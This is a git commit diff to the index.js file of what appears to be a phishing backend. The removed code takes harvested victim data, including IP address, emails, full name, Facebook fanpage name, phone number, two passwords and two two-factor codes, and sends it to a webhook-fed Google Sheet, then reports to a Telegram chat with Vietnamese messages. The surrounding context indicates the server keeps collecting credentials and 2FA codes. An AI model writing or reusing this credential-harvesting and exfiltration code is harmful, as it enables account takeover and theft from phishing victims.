9dcc27d6a4f240aa7575c7b9109cf51538bcf273
bangthe1124 <bangthe121@gmail.com>
2024-09-18 17:01:31 +0700

    api update

--- index.js
+++ index.js
@@ -42,35 +42,6 @@ if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
 
 }
 
-if(process.env.WEBHOOK_URL == undefined  || process.env.WEBHOOK_URL == ""){
-    // ADD GOOGLE SHEET
-    const url = new URL(process.env.WEBHOOK_URL);
-
-    url.searchParams.append('Ip', data.ip ? data.ip : '');
-    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
-    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
-    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
-    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
-    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
-    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
-    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
-    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
-    url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
-
-    axios.get(url)
-    .then(response => {
-        const data = response.data;
-        if (data.status === 'success') {
-            bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-        } else {
-            bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-        }
-    })
-    .catch(error => {
-        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
-    });
-}
-
 });
 
 app.listen(process.env.PORT, () => {
